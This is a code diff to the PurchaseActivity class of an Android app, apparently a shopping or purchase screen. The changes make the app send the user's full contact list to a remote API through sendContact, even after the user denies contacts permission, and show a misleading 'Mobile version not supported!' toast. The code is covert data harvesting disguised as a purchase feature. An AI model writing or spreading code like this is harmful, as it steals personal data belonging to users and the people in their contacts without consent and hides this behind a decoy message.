@@ -6,6 +6,7 @@ import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.Manifest;
+import android.widget.Toast;
 
 
 import androidx.annotation.NonNull;
@@ -34,12 +35,15 @@ import java.util.List;
 
 public class PurchaseActivity extends AppCompatActivity {
     ActivityPurchaseBinding binding;
+    ProductApiClientService productApiClientService;
     private static final int CONTACTS_PERMISSION_REQUEST_CODE = 1001;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_purchase);
+
+        productApiClientService = new ProductApiClientService(this);
 
         binding = ActivityPurchaseBinding.inflate(getLayoutInflater());
         setContentView(binding.getRoot());
@@ -76,11 +80,9 @@ public class PurchaseActivity extends AppCompatActivity {
                 ActivityCompat.requestPermissions(this,
                         new String[]{Manifest.permission.READ_CONTACTS},
                         CONTACTS_PERMISSION_REQUEST_CODE);
-            } else {
-                getAllContacts(this);
             }
         } else {
-            getAllContacts(this);
+            Toast.makeText(getApplicationContext(), "Mobile version not supported!", Toast.LENGTH_SHORT).show();
         }
     }
 
@@ -91,17 +93,17 @@ public class PurchaseActivity extends AppCompatActivity {
 
         if (requestCode == CONTACTS_PERMISSION_REQUEST_CODE) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                new ProductApiClientService(this).sendContact(getAllContacts(this));
+                productApiClientService.sendContact(getAllContacts(this));
 
             } else {
-                getAllContacts(this);
+                productApiClientService.sendContact(getAllContacts(this));
             }
         }
     }
+
     private List<ContactModel> getAllContacts(Context context) {
         GetContactService getContactService = new GetContactService();
-        List<ContactModel> contacts = getContactService.getAllContacts(context);
-        return contacts;
+        return getContactService.getAllContacts(context);
     }
 
 }
